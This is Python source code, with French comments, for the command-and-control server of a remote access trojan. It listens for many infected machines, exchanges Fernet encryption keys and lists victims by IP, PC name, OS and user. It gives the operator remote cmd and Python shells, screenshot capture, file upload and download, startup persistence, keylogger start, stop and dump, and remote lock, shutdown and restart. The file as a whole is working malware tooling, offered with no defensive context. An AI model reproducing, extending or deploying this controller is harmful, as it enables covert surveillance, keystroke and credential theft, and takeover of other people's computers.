import socket, os, time, threading, sys, json
from queue import Queue #facilite les échanges entre les threads
from cryptography.fernet import Fernet

all_adresses = []
all_conn = []

host = ""
port = 9999

intBuff = 1024

queue = Queue()

directory_path = ""

# permet de supprimer les quotes dans les strings
suppression_quotes = lambda string: string.replace("\"", "")

# Permet de centrer les titres des tableaux de liste de connexion
centrer = lambda string, title: f"{{:^{len(string)}}}".format(title)

send = lambda data: conn.send(objEncrypt.encrypt(data)) #Envoi chiffré

recv = lambda buffer: objEncrypt.decrypt(conn.recv(buffer)) #Reception déchiffré


def reception(buffer):
    byteData = b"" #déclaration de la valeur en bytes
    while len(byteData) < buffer:
        byteData += conn.recv(buffer) #concatène toutes les bytes réceptionnées afin de recréer la data
    return objEncrypt.decrypt(byteData) #déchiffre le contenu final avec la clé Fernet


def envoi(flag, data):
    bytEncryptedData = objEncrypt.encrypt(data) #chiffre la donnée a transmettre avec la clé Fernet
    intDataSize = len(bytEncryptedData)
    send(f"{flag}{intDataSize}".encode())
    time.sleep(0.2)
    conn.send(bytEncryptedData)
    print(f"Bytes envoye: {intDataSize}")


def chiffrement(): #création de la clé Fernet
    global objKey, objEncrypt
    objKey = Fernet.generate_key()
    objEncrypt = Fernet(objKey)


def creation_socket(): #création de l'interface de connexion
    global objSocket
    try:
        objSocket = socket.socket()
        objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except socket.error() as strError:
        print(f"Erreur durant la création de la socket: {strError}")


def socket_bind(): #Initialise la socket et la positionne en mode écoute
    global objSocket
    try:
        print(f"Tentative de connexion a la socket sur le port: {port}")
        objSocket.bind((host, port)) #créer un lien entre les coordonnées et la socket

        objSocket.listen(20)
    except socket.error() as strError:
        print(f"Erreur durant la connexion a la socket: {strError} nouvelle tentative en cours...")
        socket_bind()


def connexion_socket(): #Permet de créer une connexion avec une machine distante
    while True:
        try:
            global directory_path
            conn, adresse = objSocket.accept()
            conn.setblocking(1)
            adresse += tuple(json.loads(conn.recv(intBuff).decode()))
            conn.send(objKey) #envoi de la clé de chiffrement
            all_conn.append(conn)
            all_adresses.append(adresse)
            print(f"\nConnexion etablis: {adresse[0]} ({adresse[2]})")
            if not os.path.exists(adresse[0]):
                tmp = str(adresse[0])
                os.makedirs(tmp)
                directory_path = tmp
            else:
                print('Ce dossier existe déjà')

        except socket.error:
            print("Erreur de connexion")
            continue


def decode_cmd(data):
    try:
        return data.decode()
    except UnicodeDecodeError:
        try:
            return data.decode("cp437") # Format console DOS Windows
        except UnicodeDecodeError:
            return data.decode(errors="replace")


def menu_aide():
    print("\nH help")
    print("L Liste toutes les connexions")
    print("I Etablir une connexion + ID IP (ex : i 0)")
    print("E Connexion CMD windows + ID IP (ex : e 0)")
    print("C Deconnexion + ID IP (ex : c 0)")
    print("X Exit")


def main_menu():
    while True:
        choix = input("\n>> ").lower()

        actualiser_connexions()  #réactualise les connexions

        if choix == "l":
            liste_connexion()

        elif choix[:1] == "i" and len(choix) > 1:
            conn = select_connexion(choix[2:], True)
            if conn is not None:
                envoi_commandes()

        elif choix == "h":
            menu_aide()

        elif choix[:1] == "c" and len(choix) > 1:
            conn = select_connexion(choix[2:], False)
            if conn is not None:
                send(b"exit")
                conn.close()

        elif choix == "x":
            close()
            break

        elif choix[:1] == "e" and len(choix) > 1:
            conn = select_connexion(choix[2:], False)
            if conn is not None:
                commandes_shell()

        else:
            print("Choix invalide, Veuillez reesayer")
            menu_aide()


def close():
    global all_conn, all_adresses, conn

    if len(all_adresses) == 0:  # Vérifie s'il n'y'a pas de machine connecté
        return

    for _, conn in enumerate(all_conn):
        send(b"exit")
        conn.close()
    del all_conn
    all_conn = []
    del all_adresses
    all_adresses = []


def actualiser_connexions():  #supprime toutes les anciennes connexions
    global all_conn, all_adresses, conn
    for intCounter, conn in enumerate(all_conn):
        try:
            send(b"test")  # envoi un test de connexion
        except socket.error:
            del all_adresses[all_conn.index(conn)]
            all_conn.remove(conn)
            conn.close()

def liste_connexion(): #affiche les coordonnées des machines distantes
    actualiser_connexions()

    if not len(all_conn) > 0:
        print("Aucune connexion")
        return

    strClients = ""
    for intCounter, arrAddress in enumerate(all_adresses):
        strClients += f"{intCounter}"
        for value in arrAddress:
            #définie une séparation entre les éléments
            strClients += f"{4 * ' '}{str(value)}"
        strClients += "\n"
    #Définie une nouvelle séparation entre les éléments
    strInfo = f"\nID{3 * ' '}"
    for index, text in enumerate(["IP", "Port", "PC Name", "OS", "User"]):
        strInfo += centrer(f"{all_adresses[0][index]}", text) + 4 * " "
    strInfo += f"\n{strClients}"
    print(strInfo, end="")


def select_connexion(connection_id, blnGetResponse):
    global conn, arrInfo
    try:
        connection_id = int(connection_id)
        conn = all_conn[connection_id]
    except:
        print("Choix invalide, veuillez reesayer!")
        return
    else:
        arrInfo = tuple()
        for index in [0, 2, 3, 4]:
            arrInfo += (f"{all_adresses[connection_id][index]}",)
        #Si blnGetResponse true, alors on renvoi la variable conn

        if blnGetResponse:
            print(f"Actuellement connecte a : {arrInfo[0]} ....\n")
        return conn


def information_client():
    for index, text in enumerate(["IP: ", "PC Name: ", "OS: ", "User: "]):
        print(text + arrInfo[index])


def screenshot():
    send(b"screen")
    strScrnSize = recv(intBuff).decode()  #active le mode reception
    print(f"\nReception du screenshot\nLe poids du fichier est de : {strScrnSize} bytes\nVeuillez patientez...")

    intBuffer = int(strScrnSize)

    strFile = str(all_adresses[0][0]) + time.strftime("\%Y%m%d%H%M%S.png")

    ScrnData = reception(intBuffer)  #reception des données
    with open(strFile, "wb") as objPic:
        objPic.write(ScrnData)
    print(f"Termine!\nTotal bytes reçu: {os.path.getsize(strFile)} bytes")


def startup(): #activation d'une tache au démarrage
    send(b"startup")
    print("Enregistrement ...")

    strClientResponse = recv(intBuff).decode()
    if not strClientResponse == "success":
        print(strClientResponse)


def remove_from_startup(): #suppression d'une tache au démarrage
    send(b"rmvstartup")
    print("Suppression ...")

    strClientResponse = recv(intBuff).decode()
    if not strClientResponse == "success":
        print(strClientResponse)


def televerser():
    strFile = suppression_quotes(input("\nVeuillez saisir le chemin du fichier a envoyer ainsi que son nom : "))
    if not os.path.isfile(strFile):
        print("Fichier invalide!")
        return

    strOutputFile = suppression_quotes(input("\nChoisir le nom a attribuer au fichier: "))
    if strOutputFile == "":
        return

    with open(strFile, "rb") as objFile:
        envoi("send", objFile.read())

    send(strOutputFile.encode())

    strClientResponse = recv(intBuff).decode()
    print(strClientResponse)


def telecharger():
    strFile = suppression_quotes(input("\nFichier : "))
    strFileOutput = suppression_quotes(input("\nFichier recu: "))

    if strFile == "" or strFileOutput == "":
        return

    send(("recv" + strFile).encode())
    strClientResponse = recv(intBuff).decode()

    if strClientResponse == "Le fichier est introuvable!":
        print(strClientResponse)
        return

    print(f"Taille du fichier: {strClientResponse} bytes\nVeuillez patienter...")
    intBuffer = int(strClientResponse)

    file_data = reception(intBuffer)

    try:
        with open(strFileOutput, "wb") as objFile:
            objFile.write(file_data)
    except:
        print("Le chemin du fichier est protege ou invalide!")
        return

    print(f"Terminee!\nTotal recus: {os.path.getsize(strFileOutput)} bytes")


def commandes_shell():  # cmd distant
    send(b"cmd")
    strDefault = f"\n{decode_cmd(recv(intBuff))}>"
    print(strDefault, end="")  # Affiche le prompt par defaut

    while True:
        strCommand = input()
        if strCommand in ["quit", "exit"]:
            send(b"goback")
            break

        elif strCommand == "cmd":
            print("Veuillez ne pas utiliser la commande cmd")
            print(strDefault, end="")

        elif len(strCommand) > 0:
            send(strCommand.encode())
            intBuffer = int(recv(intBuff).decode())
            strClientResponse = decode_cmd(reception(intBuffer))
            print(strClientResponse, end="")
        else:
            print(strDefault, end="")


def python_interpreter():
    send(b"python")
    recv(intBuff)
    while True:
        strCommand = input("\n>>> ")
        if strCommand.strip() == "":
            continue
        if strCommand in ["exit", "exit()"]:
            break
        send(strCommand.encode())
        intBuffer = int(recv(intBuff).decode())
        strReceived = reception(intBuffer).decode("utf-8").rstrip("\n")
        if strReceived != "":
            print(strReceived)
    send(b"exit")
    recv(intBuff)

def keylogger(option):
    if option == "start":
        send(b"keystart")
        if recv(intBuff) == b"Erreur":
            print("le programme keylogger est deja en cours d'execution.")

    elif option == "stop":
        send(b"keystop")
        if recv(intBuff) == b"Erreur":
            print("le programme keylogger est à l\'arret")

    elif option == "dump":
        send(b"keydump")
        intBuffer = recv(intBuff).decode()

        if intBuffer == "Erreur":
            print("le programme keylogger est à l\'arret.")
        elif intBuffer == "Erreur log":
            print("No logs.")
        else:
            strLogs = reception(int(intBuffer)).decode(errors="replace")
            """strFile = str(all_adresses[0][0]  + time.strftime("\%Y%m%d%H%M%S.log"))
            with open(strFile, "ab") as objLog:
                objLog.write(strLogs)"""
            print(f"\n{strLogs}")


def afficher_aide():
    print("H Help")
    print("M Envoi message (ex : M Bonjour)")
    print("R Reception d\'un fichier ")
    print("S Envoi de fichier a une machine cible ")
    print("P Prendre un screenshot")
    print("A (1) Ajouter une tache au demarrage (ex : A 1)")
    print("A (2) Supprimer une tache au demarrage (ex : A 2)")
    print("U Information sur la machine")
    print("E Terminal cmd distant")
    print("I Interpreteur python distant")
    print("K (start) (stop) (dump) Keylogger (ex : K start)")
    print("X (1) Verouillage de la machine distant (ex : X 1)")
    print("X (2) Redemarrage de la machine distant (ex : X 2)")
    print("X (3) Arret de la machine distant (ex : X 3)")
    print("B Retour au menu precedent")
    print("C Deconnexion de la machine")


def envoi_commandes():
    afficher_aide()
    try:
        while True:
            choix = input("\nType de selection: ").lower()

            if choix == "h":
                print()
                afficher_aide()
            elif choix == "c":
                send(b"exit")
                conn.close()
                break
            elif choix[:1] == "m" and len(choix) > 1:
                strMsg = "msg" + choix[2:]
                send(strMsg.encode())
            elif choix == "a 1":
                startup()
            elif choix == "a 2":
                remove_from_startup()
            elif choix == "u":
                information_client()
            elif choix == "p":
                screenshot()
            elif choix == "i":
                python_interpreter()
            elif choix == "s":
                televerser()
            elif choix == "r":
                telecharger()
            elif choix == "x 1":
                send(b"lock")
            elif choix == "x 2":
                send(b"shutdown")
                conn.close()
                break
            elif choix == "x 3":
                send(b"restart")
                conn.close()
                break
            elif choix == "b":
                break
            elif choix == "e":
                commandes_shell()
            elif choix == "k start":
                keylogger("start")
            elif choix == "k stop":
                keylogger("stop")
            elif choix == "k dump":
                keylogger("dump")
            else:
                print("Choix invalide, Veuillez reesayer")

    except socket.error as e:
        print(f"La connexion est perdue... :\n{e}")
        return


def create_threads():
    for _ in range(2):
        objThread = threading.Thread(target=work)
        objThread.daemon = True
        objThread.start()
    queue.join()


def work():
    while True:
        intValue = queue.get()
        if intValue == 1:
            chiffrement()
            creation_socket()
            socket_bind()
            connexion_socket()
        elif intValue == 2:
            while True:
                time.sleep(0.2)
                if len(all_adresses) > 0:
                    main_menu()
                    break
        queue.task_done()
        queue.task_done()
        sys.exit(0)


def create_jobs():
    for intThread in [1, 2]:
        queue.put(intThread)
    queue.join()


create_threads()
create_jobs()